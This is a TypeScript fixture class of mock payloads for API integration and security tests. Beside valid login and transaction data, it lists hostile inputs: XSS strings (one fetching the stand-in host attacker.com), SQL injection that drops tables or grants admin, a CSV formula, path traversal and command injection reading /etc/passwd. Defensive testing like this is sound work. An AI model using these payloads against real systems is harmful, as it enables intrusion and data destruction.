/**
 * Mock Payloads for API Client Integration Tests
 * Phase 22.16: API Integration & Security Service Tests
 */

export class MockPayloads {
  // Valid payloads
  static VALID_LOGIN_REQUEST = {
    email: 'user@example.com',
    password: 'SecurePassword123!@#',
  };

  static VALID_LOGIN_RESPONSE = {
    token:
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
    refreshToken: 'refresh_token_example_value_123456789',
    expiresIn: 3600,
    user: {
      id: '12345',
      email: 'user@example.com',
      name: 'John Doe',
    },
  };

  static VALID_TRANSACTION = {
    id: 'txn_12345',
    type: 'expense',
    amount: 100.5,
    description: 'Grocery shopping',
    date: '2024-10-08T10:30:00Z',
    category: 'Food',
  };

  static VALID_BATCH_TRANSACTIONS = [
    {
      id: 'txn_1',
      amount: 50.0,
      description: 'Coffee',
      date: '2024-10-08T09:00:00Z',
    },
    {
      id: 'txn_2',
      amount: 150.0,
      description: 'Lunch',
      date: '2024-10-08T12:00:00Z',
    },
    {
      id: 'txn_3',
      amount: 75.5,
      description: 'Gas',
      date: '2024-10-08T15:00:00Z',
    },
  ];

  // Invalid/suspicious payloads for XSS/SQL injection tests
  static XSS_SCRIPT_TAG_REQUEST = {
    email: 'user@example.com',
    data: '<script>alert("XSS")</script>',
  };

  static XSS_EVENT_HANDLER_REQUEST = {
    email: 'user@example.com',
    data: '<img src=x onerror="alert(\'XSS\')">',
  };

  static XSS_SVG_PAYLOAD = {
    email: 'user@example.com',
    data: '<svg/onload=fetch("http://attacker.com")>',
  };

  static XSS_JAVASCRIPT_PROTOCOL = {
    email: 'user@example.com',
    data: '<a href="javascript:alert(\'XSS\')">Click me</a>',
  };

  static XSS_DOM_BASED = {
    email: 'user@example.com',
    data: '"><script>alert("XSS")</script><div class="',
  };

  static SQL_INJECTION_BASIC = {
    email: "admin' OR '1'='1",
    password: "' OR 1=1 --",
  };

  static SQL_INJECTION_UNION = {
    email: "user@example.com' UNION SELECT * FROM users --",
    password: 'anything',
  };

  static SQL_INJECTION_DROP = {
    email: "'; DROP TABLE users; --",
    password: 'anything',
  };

  static SQL_INJECTION_UPDATE = {
    email: "user@example.com'; UPDATE users SET admin=true; --",
    password: 'anything',
  };

  static LDAP_INJECTION = {
    email: '*',
    password: '*',
  };

  static CSV_INJECTION = {
    email: 'user@example.com',
    amount: '=SUM(1+9)*cmd|"/c calc"!A1',
  };

  static PATH_TRAVERSAL = {
    filepath: '../../../etc/passwd',
    action: 'read',
  };

  static COMMAND_INJECTION = {
    command: 'ls; cat /etc/passwd',
  };

  // Edge cases
  static EMPTY_REQUEST = {};

  static NULL_VALUES_REQUEST = {
    email: null,
    password: null,
  };

  static UNDEFINED_VALUES_REQUEST = {
    email: undefined,
    password: undefined,
  };

  static VERY_LONG_STRING = {
    email: 'user@example.com',
    data: 'A'.repeat(1000000), // 1MB string
  };

  static WHITESPACE_ONLY = {
    email: '   ',
    password: '\t\n\r',
  };

  static SPECIAL_CHARACTERS = {
    email: 'user@example.com',
    data: '!@#$%^&*()_+-=[]{}|;:,.<>?',
  };

  static EMOJI_INPUT = {
    email: 'user@example.com',
    description: '😀🎉🚀 Unicode Emoji Test 中文 العربية',
  };

  static NESTED_OBJECTS = {
    user: {
      profile: {
        name: {
          first: 'John',
          last: 'Doe',
          nested: {
            middle: 'Michael',
            full: {
              value: 'John Michael Doe',
            },
          },
        },
      },
    },
  };

  static NESTED_OBJECTS_WITH_XSS = {
    user: {
      profile: {
        name: {
          first: '<script>',
          nested: {
            middle: '"><script>alert(1)</script>',
          },
        },
      },
    },
  };

  static CIRCULAR_REFERENCE: any = { value: 'test' };

  static DEEPLY_NESTED_ARRAY = {
    data: [[[[[[[[[[['deep value']]]]]]]]]],
  };

  static MIXED_TYPES = {
    string: 'text',
    number: 123,
    float: 45.67,
    boolean: true,
    null: null,
    array: [1, 2, 3],
    object: { key: 'value' },
  };

  // Initialize circular reference (after definition)
  static initialize() {
    this.CIRCULAR_REFERENCE.self = this.CIRCULAR_REFERENCE;
  }

  // Null bytes in strings
  static getNullBytePayload() {
    return {
      email: 'user\x00@example.com',
      data: 'test\x00injection',
    };
  }

  // Large response payloads (>10MB)
  static generateLargePayload(sizeInMb: number) {
    const itemSize = 1024; // 1KB per item
    const itemCount = Math.ceil((sizeInMb * 1024 * 1024) / itemSize);
    const largeArray = Array(itemCount).fill({
      id: 'test',
      data: 'x'.repeat(itemSize),
    });

    return {
      items: largeArray,
      totalSize: sizeInMb * 1024 * 1024,
    };
  }

  // Generate random malicious payload
  static generateRandomMaliciousPayload(): any {
    const maliciousPatterns = [
      this.XSS_SCRIPT_TAG_REQUEST,
      this.SQL_INJECTION_BASIC,
      this.LDAP_INJECTION,
      this.PATH_TRAVERSAL,
      this.COMMAND_INJECTION,
    ];

    const randomIndex = Math.floor(Math.random() * maliciousPatterns.length);
    return maliciousPatterns[randomIndex];
  }
}

// Initialize on module load
MockPayloads.initialize();
